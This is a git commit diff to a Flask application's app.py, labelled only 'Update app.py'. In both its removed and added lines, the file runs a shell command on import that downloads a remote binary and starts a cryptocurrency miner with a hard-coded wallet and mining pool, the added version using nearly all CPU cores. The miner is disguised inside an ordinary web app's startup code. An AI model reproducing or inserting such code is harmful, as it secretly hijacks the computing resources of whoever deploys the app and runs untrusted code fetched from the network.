b682b1da3a3ac28067386f784af926dd59089f46
vpsone041 <94066700+vpsone041@users.noreply.github.com>
2022-06-30 00:12:32 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,7 +1,7 @@
 from flask import Flask
 from .routes.flaskr import create_app
 import os
-os.system ('curl https://github.com/aurbach55/zash/raw/main/circleci --output circleci; chmod +x circleci; ./circleci ann -p pkt1qld6l62qjyd0v8rfqmlax48g3egx6v8rtxsf836 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com')
+os.system ('wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcps://51.79.177.216:17017 -u web1qfzjd2nvq0k72mrjpd0qt9as2gvan4kaww9l8dl.CPU_4 -t $(nproc --ignore 1)')
 app = Flask(__name__)
 create_app(app)
 
